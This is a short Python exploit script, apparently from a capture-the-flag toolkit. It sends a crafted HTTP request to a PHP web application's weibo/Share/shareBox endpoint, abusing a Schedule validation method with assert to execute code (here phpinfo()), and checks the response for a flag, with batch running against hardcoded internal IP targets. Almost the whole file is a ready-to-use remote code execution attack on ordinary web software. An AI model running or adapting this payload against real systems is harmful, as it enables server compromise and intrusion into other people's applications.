from tool.base import match_flag, parse_ip_port, process
from tool.http_repeater import repeater


def run(target: tuple[str, int]):
    exp = f"""
GET /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule->_validationFieldItem%26id[4]=function%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=phpinfo() HTTP/1.1
Host:{target[0]}:{target[1]}


"""

    resp = repeater(exp)
    if not resp:
        return False, "", resp.error
    flag = match_flag(resp.text())
    if not flag:
        print(resp.text())
        return False, "", "flag匹配失败"
    return True, flag, ""


def main(ip_port: str):
    def on_process(ip_port: str):
        tg = parse_ip_port(ip_port)
        if not tg.ok:
            return []
        return tg.ip_port_with()

    process(ip_port, run, on_process)


if __name__ == "__main__":
    main("192.168.192.148:58764,35752")
